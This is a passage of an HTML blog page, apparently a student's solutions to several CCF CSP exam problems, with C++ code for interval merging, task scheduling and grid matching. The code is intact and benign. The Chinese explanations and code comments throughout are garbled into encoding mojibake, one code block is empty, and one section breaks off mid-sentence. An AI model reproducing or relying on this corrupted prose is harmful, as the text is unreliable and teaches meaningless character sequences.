style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">Ã—</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mclose">))</span></span></span></span></span></p><p>å³å¯ã€‚è¿˜è¦æ³¨æ„ä¸€ä¸ªå‘å°±æ˜¯éœ€è¦å¼€long longï¼Œä¸å¼€å®¹æ˜“çˆ†ã€‚</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure><h2 id="202303-2-å¦ç”°è®¡åˆ’">202303-2 å¦ç”°è®¡åˆ’</h2><p>è¿™é“é¢˜ç›®æœ‰70%çš„åˆ†æ˜¯å¾ˆå¥½æ‹¿çš„ï¼Œæš´åŠ›å°±èƒ½å†™ã€‚æš´åŠ›æ€è·¯å¾ˆç®€å•ï¼Œå°±æ˜¯æ¯æ¬¡éƒ½æ‰¾è€—æ—¶æœ€é•¿çš„åŒºåŸŸï¼ŒæŠŠè€—æ—¶æœ€é•¿çš„åŒºåŸŸæŠ•å…¥é¢å¤–èµ„æºï¼Œä¹Ÿå°±æ˜¯æ¯æ¬¡è€—æ—¶å‡ä¸€ï¼Œéšåèµ„æºæ€»æ•°å‡å»æ‰€éœ€èµ„æºæ•°ï¼Œç›´åˆ°èµ„æºæ€»æ•°ç­‰äº0æˆ–è€—æ—¶æœ€é•¿çš„åŒºåŸŸå·²ç»æ— æ³•å†ç»§ç»­å‡äº†ï¼ˆä¹Ÿå°±æ˜¯è€—æ—¶æœ€é•¿çš„åŒºåŸŸçš„æ—¶é—´éƒ½æ¯”kå°ï¼‰ï¼Œè¿™æ—¶å€™è¿›è¡Œè¾“å‡ºã€‚</p><p>ä¸å‡ºæ„å¤–çš„è¯è‚¯å®šä¼šå‡ºæ„å¤–ï¼Œè¿™æ ·æƒ³åªèƒ½æ‹¿70çš„åˆ†ï¼Œå› ä¸ºè¿˜æœ‰30%çš„æµ‹è¯•é›†æ•°æ®é‡å¤ªå¤§äº†ï¼Œä¹Ÿå°±æ˜¯è¯´mæ¯æ¬¡å‡å°‘çš„å¤ªå°‘äº†ï¼Œéœ€è¦å¤šå‡ä¸€ç‚¹ã€‚äºæ˜¯å¯ä»¥æƒ³åˆ°åŒºé—´åˆå¹¶ã€‚æ—¢ç„¶å‡çš„å¤ªå°‘ï¼Œè€Œä¸”å¿…é¡»æŠŠæ‰€æœ‰åŒä¸€å€¼å…¨éƒ¨å‡ä¸€ï¼Œæœ€åçš„è€—æ—¶æ‰ä¼šå‡ä¸€ï¼Œé‚£æˆ‘ç›´æ¥æŠŠæ‰€æœ‰åŒä¸€å€¼çš„åŒºé—´åˆå¹¶ï¼ŒæŠŠä»–ä»¬çš„èµ„æºæ¶ˆè€—æ•°é‡ä¹Ÿåˆå¹¶ï¼Œè¿™æ ·ä¸å°±å¥½äº†å—ã€‚ç†è®ºæ²¡é—®é¢˜ï¼Œå¼€å§‹å®è·µï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;math.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">1e5</span><span class="hljs-number">+10</span>;<br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n,k;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> m;<br>    cin &gt;&gt; n &gt;&gt; m &gt;&gt; k;<br>    <span class="hljs-type">int</span> <span class="hljs-type">max_t</span>=<span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> t,c;<br>    <span class="hljs-type">int</span> field[N];<br>    <span class="hljs-built_in">memset</span>(field,<span class="hljs-number">0</span>,<span class="hljs-built_in">sizeof</span>(field));<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>    &#123;<br>        cin &gt;&gt; t &gt;&gt; c;<br>        field[t]+=c;<br>        <span class="hljs-type">max_t</span>=<span class="hljs-built_in">max</span>(t,<span class="hljs-type">max_t</span>);<span class="hljs-comment">//è®°å½•ä¸€ä¸‹æ­¤æ—¶çš„æœ€å¤§å€¼ï¼Œæ–¹ä¾¿ç¬¬ä¸€æ¬¡çš„æŸ¥æ‰¾</span><br>    &#125;<br>    <span class="hljs-keyword">while</span>(m&gt;<span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-type">max_t</span>&gt;k&amp;&amp;m&gt;field[<span class="hljs-type">max_t</span>])<br>        &#123;<br>            m-=field[<span class="hljs-type">max_t</span>];<br>            <span class="hljs-type">max_t</span>--;<br>            field[<span class="hljs-type">max_t</span>]+=field[<span class="hljs-type">max_t</span><span class="hljs-number">+1</span>];<span class="hljs-comment">//æ¯æ¬¡æœ€å¤§å€¼å‡ä¸€ä¹‹åï¼Œmax-1çš„æ¶ˆè€—éœ€è¦åŠ ä¸Šä¹‹å‰maxçš„æ¶ˆè€—</span><br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    cout &lt;&lt; <span class="hljs-type">max_t</span> &lt;&lt; endl;<br><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">// 5 50 1</span><br><span class="hljs-comment">// 9 1</span><br><span class="hljs-comment">// 8 1</span><br><span class="hljs-comment">// 6 1</span><br><span class="hljs-comment">// 3 1</span><br><span class="hljs-comment">// 1 1</span><br><span class="hljs-comment">// 7</span><br><span class="hljs-comment">// 9 8 6 3 1</span><br></code></pre></td></tr></table></figure><h1 id="2022å¹´">2022å¹´</h1><h2 id="202212-2-è®­ç»ƒè®¡åˆ’">202212-2 è®­ç»ƒè®¡åˆ’</h2><p>è¿™é“é¢˜ä¹Ÿæ˜¯æ‹¿å‰70%å¾ˆç®€å•ï¼Œä½†æ˜¯å30%å°±éœ€è¦ä»”ç»†æ€è€ƒäº†ã€‚</p><p>ä»”ç»†æƒ³æƒ³ï¼Œè¿™é“é¢˜æ±‚æœ€æ™šå¼€å§‹æ—¶é—´æ¯”è¾ƒéš¾æƒ³é€šã€‚é¦–å…ˆå¦‚æœè¿™ä¸ªèŠ‚ç‚¹æ˜¯æ²¡æœ‰è¢«ä¾èµ–çš„èŠ‚ç‚¹ï¼Œé‚£å®ƒçš„æœ€æ™šå¼€å§‹æ—¶é—´å…¶å®å°±æ˜¯n-è‡ªå·±çš„æ—¶é—´+1ã€‚å¦‚æœèŠ‚ç‚¹x1æ˜¯è¢«x2ä¾èµ–çš„èŠ‚ç‚¹ï¼Œé‚£ä¹ˆå®ƒçš„æœ€æ™šå¼€å§‹æ—¶é—´å…¶å®æ˜¯x2çš„æœ€æ™šå¼€å§‹æ—¶é—´-x1çš„æ—¶é—´ï¼Œå¦‚æœèŠ‚ç‚¹x1è¢«å¤šä¸ªèŠ‚ç‚¹ä¾èµ–ï¼Œé‚£å®ƒçš„æœ€æ™šå¼€å§‹æ—¶é—´å…¶å®æ˜¯min(å½“å‰è¢«ä¾èµ–èŠ‚ç‚¹çš„æœ€æ™šå¼€å§‹æ—¶é—´-x1çš„æ—¶é—´,ä¸Šä¸€ä¸ªè¢«ä¾èµ–èŠ‚ç‚¹çš„æœ€æ™šå¼€å§‹æ—¶é—´-x1çš„æ—¶é—´)ã€‚</p><p>æ‰€ä»¥å°±èƒ½å¾—åˆ°é€’æ¨å…¬å¼xm[p].follow_day=min(xm[i].follow_day-xm[p].t,xm[p].follow_day);</p><p>æ¢³ç†å¥½æ€è·¯ï¼Œæ¥ä¸‹æ¥å°±ç®€å•å¾ˆå¤šäº†ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;math.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">110</span>;<br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">exprise</span><br>&#123;<br>    <span class="hljs-type">int</span> pre;<br>    <span class="hljs-type">int</span> pre_day=<span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> follow_day=<span class="hljs-number">1e9</span>;<br>    <span class="hljs-type">int</span> follow=<span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> t;<br>&#125; xm[N];<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n,sum=<span class="hljs-number">0</span>,m,p,t;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d %d&quot;</span>,&amp;n,&amp;m);<br>    xm[<span class="hljs-number">0</span>].t=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= m; i++)<br>    &#123;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;p);<br>        xm[i].pre=p;<br>        xm[p].follow=<span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= m; i++)<br>    &#123;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;t);<br><br>        <span class="hljs-keyword">if</span>(sum&lt;t)<span class="hljs-comment">//æ›´æ–°æœ€å¤§</span><br>        sum=t;<br><br>        p=xm[i].pre;<br>        xm[i].t=t;<br><br>        <span class="hljs-keyword">if</span>(p) <span class="hljs-comment">//æ›´æ–°ä¾èµ–çš„å¤©æ•°</span><br>        xm[i].pre_day+=xm[p].pre_day+xm[p].t;<br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= m; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(xm[i].pre==<span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,<span class="hljs-number">1</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,xm[i].pre_day<span class="hljs-number">+1</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-type">bool</span> flag=<span class="hljs-literal">true</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = m; i &gt;= <span class="hljs-number">1</span>; i--)<br>    &#123;<br>        p=xm[i].pre;<br>        <span class="hljs-keyword">if</span>(p!=<span class="hljs-number">0</span>&amp;&amp;xm[i].follow==<span class="hljs-number">0</span>)<span class="hljs-comment">//æœ‰å‰é©±æ— åç»§</span><br>        &#123;<br>            xm[i].follow_day=n-xm[i].t<span class="hljs-number">+1</span>;<br>            xm[p].follow_day=<span class="hljs-built_in">min</span>(xm[i].follow_day-xm[p].t,xm[p].follow_day);<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(p!=<span class="hljs-number">0</span>&amp;&amp;xm[i].follow==<span class="hljs-number">1</span>)<span class="hljs-comment">//æœ‰å‰é©±æœ‰åç»§ï¼Œæ›´æ–°å‰é©±(è‡ªå·±çš„è¢«åç»§æ›´æ–°è¿‡äº†)</span><br>        &#123;<br>            xm[p].follow_day=<span class="hljs-built_in">min</span>(xm[i].follow_day-xm[p].t,xm[p].follow_day);<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(xm[i].follow==<span class="hljs-number">0</span>&amp;&amp;p==<span class="hljs-number">0</span>)<span class="hljs-comment">//æ— å‰é©±åç»§</span><br>        &#123;<br>            xm[i].follow_day=n-xm[i].t<span class="hljs-number">+1</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(xm[p].follow_day&lt;<span class="hljs-number">0</span>)<br>        &#123;<br>            flag=<span class="hljs-literal">false</span>;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!flag)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= m; i++)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,xm[i].follow_day);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="202209-2-ä½•ä»¥åŒ…é‚®">202209-2 ä½•ä»¥åŒ…é‚®</h2><p>è¿™é“é¢˜å°±æ˜¯èƒŒåŒ…é—®é¢˜ï¼Œä¸€å¼€å§‹å¿˜äº†èƒŒåŒ…å’‹å†™çš„äº†ï¼Œè¿‘å‡ å¹´çœŸçš„æ˜¯è¶Šæ¥è¶Šéš¾äº†ã€‚ä¹‹åä¸Šç½‘æœç´¢ä¹‹åå‘ç°èƒŒåŒ…é—®é¢˜å…¶å®æ¯”è¾ƒå¥—è·¯ï¼Œä½†æ˜¯çŠ¶æ€è½¬ç§»æ–¹ç¨‹çœŸçš„å¾ˆä¸å¥½æƒ³ã€‚è¿™é“é¢˜ç¨å¾®åšäº†ä¸€ç‚¹å˜å½¢ï¼Œå°±ä¸æ˜¯å¾ˆåšçš„å‡ºæ¥äº†ã€‚</p><p>é¦–å…ˆéœ€è¦æ˜ç¡®çš„æ˜¯è¿™é“é¢˜å’ŒèƒŒåŒ…é—®é¢˜æœ‰ä»€ä¹ˆå¼‚åŒï¼Ÿå¯ä»¥çœ‹åˆ°è¿™é“é¢˜ä¸­æ¯æœ¬ä¹¦åªèƒ½é€‰æ‹©ä¸€æ¬¡ï¼Œå¹¶ä¸”æ‰€æœ‰é€‰æ‹©çš„ä¹¦çš„ä»·å€¼å¿…é¡»å¤§äºxï¼Œè¿™å’ŒèƒŒåŒ…é—®é¢˜ä¸­çš„é€‰æ‹©ä»·å€¼æœ€å¤§çš„ç‰©å“éå¸¸åƒã€‚ä½†æ˜¯è¿™é“é¢˜åˆæœ‰ç‚¹ä¸åŒï¼Œå®ƒéœ€è¦åœ¨å•†å“çš„ä»·å€¼æ»¡è¶³å¤§äºxçš„åŒæ—¶åˆæ˜¯æœ€å°å€¼ã€‚</p><p>é‚£æˆ‘ä»¬è¯¥æ€ä¹ˆå®šä¹‰è¿™ä¸ªé—®é¢˜ï¼Œè®©å®ƒå’ŒèƒŒåŒ…é—®é¢˜çœ‹èµ·æ¥å·®ä¸å¤šå‘¢ï¼Ÿä¸»è¦åœ¨äºå¯¹äºé¢˜ç›®ä¸­ç»™å®šæ¡ä»¶çš„è½¬æ¢ï¼Œå…¶å®å¤§äºxä¹Ÿå°±æ˜¯é€‰å®šå•†å“æ€»ä»·å€¼å‡xæ˜¯å¤§äº0çš„ï¼Œè¿™ä¸ªæƒ…å†µä¸‹é€‰å–æœ€å°çš„æ•°</p><h2 id="202206-2-å¯»å®ï¼å¤§å†’é™©ï¼">202206-2 å¯»å®ï¼å¤§å†’é™©ï¼</h2><p>è¿™é“é¢˜ä¸çŸ¥é“å’‹ç”¨ç®—æ³•ï¼Œä½†æ˜¯æœ‰ä¸€äº›ä¼˜åŒ–çš„æ€è·¯ï¼Œè™½ç„¶æœ€åè¿˜æ˜¯å†™æˆå±å±±ï¼Œä½†æ˜¯æ€»ç®—æ˜¯æ»¡åˆ†äº†ã€‚</p><p>70%é‚£éƒ¨åˆ†æ•°æ®å°±ä¸è¯´äº†ï¼Œçº¯æ„å»ºä¸¤ä¸ªäºŒç»´æ•°ç»„éå†å³å¯ã€‚è¯´ä¸€è¯´å¦å¤–30%çš„æ•°æ®ï¼Œè¿™éƒ¨åˆ†æˆ‘çš„ä¼˜åŒ–æ€è·¯å°±æ˜¯å¯¹äºæ¯ä¸ªåœ¨ç»¿åŒ–å›¾ä¸­çš„æ ‘ï¼Œéƒ½æ‹¿å¯»å®å›¾çš„B(0,0)å»å°è¯•ç¢°ä¸€ç¢°ã€‚</p><p>é¦–å…ˆæ˜¯å¯¹äºç»¿åŒ–å›¾ä¸­çš„æ ‘ï¼Œåªç”¨ä¸€ä¸ªä¸€ç»´æ•°ç»„è¿›è¡Œå­˜å‚¨ï¼Œè‡ªå®šä¹‰ä¸€ä¸ªå¸¦xå’Œyçš„ç»“æ„ä½“å³å¯ï¼Œ</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;math.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">zuobiao</span><br>&#123;<br>    <span class="hljs-type">int</span> x;<br>    <span class="hljs-type">int</span> y;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">cmp</span><span class="hljs-params">(zuobiao a, zuobiao b)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(a.x==b.x)<br>    <span class="hljs-keyword">return</span> a.y&lt;b.y;<br>    <span class="hljs-keyword">else</span><br>    <span class="hljs-keyword">return</span> a.x&lt;b.x;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n,L,S;<br>    cin &gt;&gt; n &gt;&gt; L &gt;&gt; S;<br>    zuobiao trees[<span class="hljs-number">1010</span>];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>    &#123;<br>        cin &gt;&gt; trees[i].x &gt;&gt; trees[i].y;<br>    &#125;<br>    <span class="hljs-type">int</span> t_map[<span class="hljs-number">51</span>][<span class="hljs-number">51</span>];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = S; i &gt;= <span class="hljs-number">0</span>; i--)<br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt;= S; j++)<br>        &#123;<br>            cin &gt;&gt; t_map[i][j];<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">sort</span>(trees,trees+n,cmp);<br>    <span class="hljs-type">int</span> cnt=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> ea = <span class="hljs-number">0</span>; ea &lt; n; ea++)<br>    &#123;<br>        <span class="hljs-type">bool</span> flag=<span class="hljs-literal">true</span>;<br><br>        <span class="hljs-comment">//å³A(x,y)ä¸B(0,0)å¯¹åº”</span><br>        <span class="hljs-type">int</span> x=trees[ea].x;<br>        <span class="hljs-type">int</span> y = trees[ea].y;<br><br>        <span class="hljs-comment">//ä»ä¸‹ä¸€ä¸ªæ ‘ï¼ˆèµ·ç‚¹çš„æ•°å·²ç»åšè¿‡æ¯”è¾ƒäº†ï¼‰å¼€å§‹éå†Bçš„æ¯ä¸€ä¸ª1ï¼ŒæŸ¥çœ‹ä½ç½®æ˜¯å¦è·Ÿä¸‹ä¸€ä¸ªAä¸­çš„1å¯¹åº”ï¼Œä¹Ÿå°±æ˜¯A(x+i,y+j)=B(i,j)</span><br>        <span class="hljs-type">int</span> ex=ea<span class="hljs-number">+1</span>;<br><br>        <span class="hljs-keyword">if</span>(x+S&gt;L||y+S&gt;L)<br>        flag=<span class="hljs-literal">false</span>;<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt;= S; i++)<br>        &#123;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt;= S; j++)<br>            &#123;<br>                <span class="hljs-keyword">if</span>(i==<span class="hljs-number">0</span>&amp;&amp;j==<span class="hljs-number">0</span>)<br>                <span class="hljs-keyword">continue</span>;<br>                <span class="hljs-keyword">if</span>(ex&lt;n&amp;&amp;trees[ex].x==i+x&amp;&amp;trees[ex].y==j+y)<br>                &#123;<br>                    <span class="hljs-keyword">if</span>(t_map[i][j]==<span class="hljs-number">1</span>)<br>                    ex++;<br>                    <span class="hljs-keyword">else</span><br>                    &#123;<br>                        flag=<span class="hljs-literal">false</span>;<br>                        <span class="hljs-keyword">break</span>;<br>                    &#125;<br>                &#125;<br>                <span class="hljs-keyword">else</span><br>                &#123;<br>                    <span class="hljs-keyword">if</span>(t_map[i][j]==<span class="hljs-number">1</span>)<br>                    &#123;<br>                        flag=<span class="hljs-literal">false</span>;<br>                        <span class="hljs-keyword">break</span>;<br>                    &#125;<br>                &#125;<br>                <span class="hljs-keyword">while</span>(ex&lt;n)<br>                &#123;<br>                    <span class="hljs-keyword">if</span>(trees[ex].y&gt;y+S||trees[ex].y&lt;y)<br>                    ex++;<br>                    <span class="hljs-keyword">else</span><br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">if</span>(!flag)<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(flag)<br>        &#123;<br>            cnt++;<br>        &#125;<br>    &#125;<br>    cout &lt;&lt; cnt &lt;&lt; endl;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="2021å¹´">2021å¹´</h1><h2 id="202112-2-åºåˆ—æŸ¥è¯¢æ–°è§£">202112-2 åºåˆ—æŸ¥è¯¢æ–°è§£</h2><h3 id="æš´åŠ›-å‰ªæï¼ˆ80åˆ†ï¼‰">æš´åŠ›+å‰ªæï¼ˆ80åˆ†ï¼‰</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span 